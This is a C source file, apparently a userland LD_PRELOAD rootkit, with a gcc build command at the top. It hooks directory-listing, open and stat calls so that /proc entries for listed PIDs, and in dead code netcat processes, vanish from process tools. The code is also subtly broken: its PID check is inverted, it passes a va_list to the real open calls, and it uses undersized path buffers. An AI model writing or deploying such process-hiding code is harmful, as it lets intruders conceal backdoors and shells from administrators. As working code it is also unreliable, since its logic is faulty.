/*
gcc -shared -fPIC mod.c -o mod.so
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <unistd.h>
#include <stdarg.h>
#include <fcntl.h>

unsigned long blocked_pids[] = {102, 1001, 53, 896};
// #define DEBUG

#define load_og_func(var, name) \
    if(!var){ \
        var = dlsym(RTLD_NEXT, name); \
        if(!var) { \
            fprintf(stderr, "Error loading symbol %s: %s\n", name, dlerror()); \
            exit(1); \
        } \
    }

#ifdef DEBUG
    #define debug(fmt, ...) printf(fmt, ##__VA_ARGS__);
#else
    #define debug(fmt, ...)
#endif

typedef struct stat stat_t;
typedef struct statx statx_t;

// References to original functions
DIR *(*og_opendir)(const char *dirname);
struct dirent *(*og_readdir)(DIR *dir);
struct dirent64 *(*og_readdir64)(DIR *dir);
int (*og_open)(const char *pathname, int flags, ...);
int (*og_openat)(int dirfd, const char *pathname, int flags, ...);
int (*og_stat)(const char *restrict path, stat_t *restrict statbuf);
int (*og_statx)(int dirfd, const char *restrict path, int flags, unsigned int mask, statx_t *restrict statxbuf);

bool is_blocked_pid(unsigned long pid){
    for(size_t i = 0; i < sizeof(blocked_pids)/sizeof(blocked_pids[0]); i++){
         if(pid == blocked_pids[i])
             return false;
     }
     return true;

    // Get command and check for nc
    char path[64];
    sprintf(path, "/proc/%lu/comm", pid);
    
    FILE* f = fopen(path, "r");
    if(!f)
        return false;
    
    char comm[64];
    if(!fgets(comm, sizeof(comm), f)){
        fclose(f);
        return false;
    }
    fclose(f);

    // Remove newline
    comm[strcspn(comm, "\n")] = 0;

    debug("\tCommand: %s\n", comm);
    return strcmp(comm, "nc") == 0 || strcmp(comm, "netcat") == 0;
}

/*
 * Get a directory name given a file descriptor
 * @return 1 on success, 0 on failure
 */
static int get_dir_name_fd(int fd, char* buf, size_t size)
{
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a directory name given a DIR* handle
 * @return 1 on success, 0 on failure
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    return get_dir_name_fd(fd, buf, size);
}

/*
 * Resolve a path given a dirfd and a pathname (NOTE: This will NOT expand relative paths)
 *      An absolute pathname
 *             If path begins with a slash, then it is an absolute
 *             pathname that identifies the target file.  In this case,
 *             dirfd is ignored.
 *
 *      A relative pathname
 *             If path is a string that begins with a character other than
 *             a slash and dirfd is AT_FDCWD, then path is a relative
 *             pathname that is interpreted relative to the process's
 *             current working directory.
 *
 *      A directory-relative pathname
 *             If path is a string that begins with a character other than
 *             a slash and dirfd is a file descriptor that refers to a
 *             directory, then path is a relative pathname that is
 *             interpreted relative to the directory referred to by dirfd.
 *             (See openat(2) for an explanation of why this is useful.)
 *
 *      By file descriptor
 *             If path is an empty string (or NULL since Linux 6.11) and
 *             the AT_EMPTY_PATH flag is specified in flags (see below),
 *             then the target file is the one referred to by the file
 *             descriptor dirfd.
 * @return 1 on success, 0 on failure
 */
static int resolve_path(int dirfd, const char* pathname, int flags, char* resolved_path, size_t size) {
    if (!pathname || pathname[0] == '\0'){
        // Path by file descriptor
        if(!(flags & AT_EMPTY_PATH))
            return 0;
        return get_dir_name_fd(dirfd, resolved_path, size);   
    }

    if(pathname[0] == '/' || dirfd == AT_FDCWD) {
        // Absolute path or path from current working directory (will get resolved by realpath)
        strncpy(resolved_path, pathname, size);
        return 1;
    }

    // Directory-relative pathname
    char dir_path[size];
    if(!get_dir_name_fd(dirfd, dir_path, sizeof(dir_path)))
        return 0;
    
    snprintf(resolved_path, size, "%s/%s", dir_path, pathname);
    return 1;
}

bool is_hidden_path(const char* path) {
    char real_path[PATH_MAX];
    if(!realpath(path, real_path))
        return false;

    debug("\tReal path: %s\n", real_path);

    if(strncmp(real_path, "/proc/", 6) != 0)
        return false;

    errno = 0;
    unsigned long pid = strtoul(real_path + 6, NULL, 10); 
    if(errno)
        return false;

    if(!is_blocked_pid(pid))
        return false;
    
    debug("\tBlocked PID: %lu\n", pid);
    return true;
}

DIR* opendir(const char *name) {
    debug("opendir(%s)\n", name);

    load_og_func(og_opendir, "opendir");

    if(!is_hidden_path(name))
        return og_opendir(name);
    
    errno = ENOENT;
    return NULL;
}

int open(const char *pathname, int flags, ...) {
    debug("open(%s, %x)\n", pathname, flags);

    load_og_func(og_open, "open");

    va_list args;
    va_start(args, flags);
    if(!is_hidden_path(pathname))
        return og_open(pathname, flags, args);
    va_end(args);

    errno = ENOENT;
    return -1;
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    debug("openat(%d, %s, %x)\n", dirfd, pathname, flags);

    load_og_func(og_openat, "openat");

    char resolved_path[64];
    if(!resolve_path(dirfd, pathname, flags, resolved_path, sizeof(resolved_path))){
        errno = ENOENT;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    if(!is_hidden_path(resolved_path))
        return og_openat(dirfd, pathname, flags, args);
    va_end(args);

    errno = ENOENT;
    return -1;
}

int stat(const char *restrict path, stat_t *restrict statbuf){
    debug("stat(%s, %p)\n", path, statbuf);

    load_og_func(og_stat, "stat");

    if(!is_hidden_path(path))
        return og_stat(path, statbuf); 
    
    errno = ENOENT;
    return -1;
}

int statx(int dirfd, const char *restrict path,
                 int flags, unsigned int mask,
                statx_t *restrict statxbuf){
    debug("statx(%d, %s, %x, %x, %p)\n", dirfd, path, flags, mask, statxbuf);

    load_og_func(og_statx, "statx");

    char resolved_path[64];
    if(!resolve_path(dirfd, path, flags, resolved_path, sizeof(resolved_path))){
        errno = ENOENT;
        return -1;
    }

    if(!is_hidden_path(resolved_path))
        return og_statx(dirfd, path, flags, mask, statxbuf);
    
    errno = ENOENT;
    return -1;
}

bool is_proc_dir(DIR *d){
    char path[64];
    if(!get_dir_name(d, path, sizeof(path)))
        return false;

    debug("\tDirectory path: %s\n", path);
    return strcmp(path, "/proc") == 0;
}

struct dirent *readdir(DIR *d){
    debug("readdir(%p)\n", d);

    load_og_func(og_readdir, "readdir");

    if(!is_proc_dir(d))
        return og_readdir(d);

    // Read entries until we find one that is not blocked
    struct dirent* entry = og_readdir(d);
    if(!entry)
        return NULL;

    errno = 0;
    unsigned long pid = strtoul(entry->d_name, NULL, 10);
    if(errno || !pid)
        return entry;

    if(!is_blocked_pid(pid))
        return entry;

    debug("\tBlocked PID: %lu\n", pid);
    return readdir(d);
}

struct dirent64 *readdir64(DIR *d){
    debug("readdir64(%p)\n", d);

    load_og_func(og_readdir64, "readdir64");

    if(!is_proc_dir(d))
        return og_readdir64(d);

    // Read entries until we find one that is not blocked
    struct dirent64* entry = og_readdir64(d);
    if(!entry)
        return NULL;

    errno = 0;
    unsigned long pid = strtoul(entry->d_name, NULL, 10);
    if(errno)
        return entry;

    if(!is_blocked_pid(pid))
        return entry;

    debug("\tBlocked PID: %lu\n", pid);
    return readdir64(d);
}
